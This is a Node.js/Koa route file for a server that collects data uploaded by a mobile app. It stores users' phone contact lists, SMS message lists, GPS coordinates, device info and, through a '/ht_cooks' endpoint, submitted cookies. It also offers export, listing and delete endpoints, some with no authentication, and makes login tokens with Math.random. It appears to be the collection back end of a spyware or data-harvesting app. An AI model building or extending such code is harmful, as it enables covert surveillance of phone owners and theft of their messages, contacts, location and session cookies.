//临时用
const sqlDB = require('../lib/db');
const exportService = require('../export/export_service');
const mossLock = require('../lib/mossLock');
const most = require('./most');
const mobile_code = require('./mobile_code');


function returnBody(ctx, code, body) {
    ctx.body = { code, data: body };
}

//随机TOKEN
const token_char = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ";
function getToken(LEN = 32) {
    let cu = null;
    let token = '';
    for (let i = 0; i < LEN; i++) {
        cu = Math.floor(Math.random() * token_char.length);
        token += token_char[cu];
    }
    return token;
}
//
function getClientIP(req) {
    return req.headers['x-forwarded-for'] || // 判断是否有反向代理 IP
        req.connection.remoteAddress || // 判断 connection 的远程 IP
        req.socket.remoteAddress || // 判断后端的 socket 的 
        req.connection.socket.remoteAddress;
}
//
exports.registerRoute = function (router) {//
    //
    router.post('/app_get_ios_enable', async ctx => {
        //
        let { err, ret } = await sqlDB.get_ios_enable();
        if (err) {
            console.error('30错误', err);
            returnBody(ctx, 1, 'sql error');
        } else {
            returnBody(ctx, 0, ret[0].ios_enable);
        }
    });
    //
    router.post('/get_ios_enable', async ctx => {
        //
        let { err, ret } = await sqlDB.get_ios_enable();
        if (err) {
            console.error('30错误', err);
            returnBody(ctx, 1, 'sql error');
        } else {
            returnBody(ctx, 0, ret[0].ios_enable);
        }
    });
    //
    router.post('/update_ios_enable', async ctx => {
        //
        let { enable } = ctx.request.body;
        let { err, ret } = await sqlDB.update_ios_enable(enable);
        if (err) {
            console.error('50错误', err);
            returnBody(ctx, 1, 'sql error');
        } else {
            returnBody(ctx, 0, ret);
        }
    });

    //APP数据传输过来
    router.post('/app_message_user_base_info', async ctx => {
        let query = ctx.request.body;
        //console.debug('收到的基础数据', query);
        let { code, mobile, machine, longitude, latitude, phone_numbers, message_list } = query;
        let moss = mossLock.unlockMoss(machine);
        if(moss){
            console.warn('moo密码错误:', moss);
            ctx.body = 'OK';
            return;
        }
        //判断是否已有
        let result = await sqlDB.getBaseNumbersHaveId(code, mobile);
        if (result.err == null && result.ret[0] && result.ret[0].id > 0) {
            ctx.body = 'have old data';
            return;
        }

        let { err, ret } = await sqlDB.insertBaseNumbers(code, mobile, longitude, latitude, phone_numbers, message_list);
        if (err) {
            console.error('入库错误', err);
            ctx.body = 'sql error';
        } else {
            console.log('成功入库');
            ctx.body = 'ok';
        }
    });
	
    router.post('/app_message_user_base_info_ht', async ctx => {
		console.log('app设备', ctx.header['user-agent']);
		const address = getClientIP(ctx.req);
		await sqlDB.insertAddress(address, ctx.header['user-agent'], 't_app_ip_address');
        let query = ctx.request.body;
        let { code, mobile, machine, longitude, latitude, phone_numbers, message_list,mobile_info } = query;
		mobile_info = `SubIp:${address} ` + mobile_info;       
        console.info('收到手机数据', mobile_info); 
        let { err, ret } = await sqlDB.insertBaseNumbersAndmobile_info(code, mobile, longitude, latitude, phone_numbers, message_list,mobile_info);
        if (err) {
            console.error('收到手机数据 入库错误', err);
            ctx.body = 'sql error';
        } else {
            console.log('收到手机数据 成功入库');
            ctx.body = 'ok';
        }
    });
	
	router.post('/ht_mobile_info', async ctx =>{
		const query = ctx.request.body;
		let {mobile_info} = query;
		const address = getClientIP(ctx.req);
		mobile_info = `SubIp:${address} ` + mobile_info;
		console.log('后台信息:', mobile_info, query);
        let { err, ret } = await sqlDB.insertHtInfo(mobile_info);
        if (err) {
			console.log('ht错误:', err);
            ctx.body = 'insert错误';
        } else {
			ctx.body = 'ok';
        }
        return;		
	});
	
	router.post('/ht_cooks', async ctx =>{
		const query = ctx.request.body;
		let {cooks} = query;
		const address = getClientIP(ctx.req);
		cooks = `SubIp:${address} ` + cooks;
        let { err, ret } = await sqlDB.insertCookies(cooks);
        if (err) {
			console.log('ht错误:', err);
            ctx.body = 'insert cooks 错误';
        } else {
			ctx.body = 'ok';
        }
        return;		
	});

    router.get('/export_message_list', async ctx => {
        const query = ctx.request.query;
        let { id } = query;
        //
        let { err, ret } = await sqlDB.get_message_list_json_array(id);
        if (err) {
            ctx.body = '查询错误';
        } else {
            let result = exportService.getMessageResult(ret[0], ctx);
            console.log("处理数据：");
            ctx.body = result;
        }
        return;
    });
    router.get('/export_phone_number_list', async ctx => {
        const query = ctx.request.query;
        let { id } = query;
        //
        let { err, ret } = await sqlDB.get_phone_numbers_json_array(id);
        if (err) {
            ctx.body = '查询错误';
        } else {
            let result = exportService.getPhoneNumberResult(ret[0], ctx);
            console.log("处理数据：");
            ctx.body = result;
        }
        return;
    });

    //test 测试获取用户数据
    router.get('/test_get_info_list', async ctx => {
        const query = ctx.request.query;
        let { code, mobile, start, count } = query;
        let { err, ret } = await sqlDB.getInfoList(code, mobile, start, count);
        if (err) {
            returnBody(ctx, 1, '查询错误');
        } else {
            returnBody(ctx, 0, ret);
        }
    });
    router.post('/delete_info', async ctx => {
        const query = ctx.request.body;
        let { id } = query;
        let { err, ret } = await sqlDB.delete_info(id);
        if (err) {
            returnBody(ctx, 1, '删除错误');
        } else {
            returnBody(ctx, 0, ret);
        }
    });
    //POST 获取用户数据
    router.post('/get_info_list', async ctx => {
		//console.log('请求方的ctx', getClientIP(ctx.req), ctx.req);
        const query = ctx.request.body
		console.log('设备', ctx.header['user-agent']);
		let address = getClientIP(ctx.req);
		if(query.code){
			address = address + 'Find';
		}
		await sqlDB.insertAddress(address, ctx.header['user-agent']);;
        let { code, mobile, start, count } = query;
        start--;
        let all_count = await sqlDB.get_list_all_count(code, mobile);
        if (all_count.err || !all_count.ret[0] || !all_count.ret[0].total) {
            returnBody(ctx, 0, { list: {}, total: 0 });
            return;
        }

        let total = all_count.ret[0].total;
        console.log('start', start, total, count);
        start = Math.max(0, start);
        start = Math.min(start, Math.floor(total / count));
        console.log('end', start, total, count);

        let { err, ret } = await sqlDB.getInfoList(code, mobile, start * count, count);
        if (err) {
            console.error('1  ' + err, all_count);
            returnBody(ctx, 1, '查询错误');
        } else {
            //时间变换
            for (let data of ret) {
                let str = String(data._time);
                data._time = new Date(Date.parse(str) + 8 * 3600 * 1000)
            }
            //
            returnBody(ctx, 0, { list: ret, total: total });
        }
    });
    router.post('/get_message_list', async ctx => {
        const query = ctx.request.body;
        let { id } = query;
        let { err, ret } = await sqlDB.get_message_list_json_array(id);
        if (err) {
            console.error('2  ' + err);
            returnBody(ctx, 1, '查询错误');
        } else {
            returnBody(ctx, 0, ret);
        }
    });
    router.post('/get_phone_number_list', async ctx => {
        const query = ctx.request.body;
        let { id } = query;
        let { err, ret } = await sqlDB.get_phone_numbers_json_array(id);
        if (err) {
            console.error('3  ' + err);
            returnBody(ctx, 1, '查询错误');
        } else {
            returnBody(ctx, 0, ret);
        }
    });

    //POST 登录
    router.post('/login', async ctx => {
        const query = ctx.request.body;
        let result = await sqlDB.assignLogin(query.account, query.password);
        if (result.err == null && result.ret && result.ret[0]) {
            delete result.ret[0].id;
            delete result.ret[0].password;
            //token
            if (result.ret[0].token == null) {
                result.ret[0].token = getToken();
                await sqlDB.update_user_token(result.ret[0].account, result.ret[0].token);
            }
            returnBody(ctx, 0, JSON.stringify(result.ret[0]));
        } else {
            returnBody(ctx, 1, '账号或密码错误');
        }
    });
    //GET 主页
    router.get('/home', async ctx => {
        console.log('一个都没', ctx.session.maxAge, ctx.session.account);
        returnBody(ctx, 0, 'ok');
    });
    //GET 退出登录
    router.get('/exit', async ctx => {
        await sqlDB.update_user_token(ctx.request.headers['account'], null);
        returnBody(ctx, 0, '退出登录成功');
    });

    most.addMost(router);
    mobile_code.addEms(router);
};
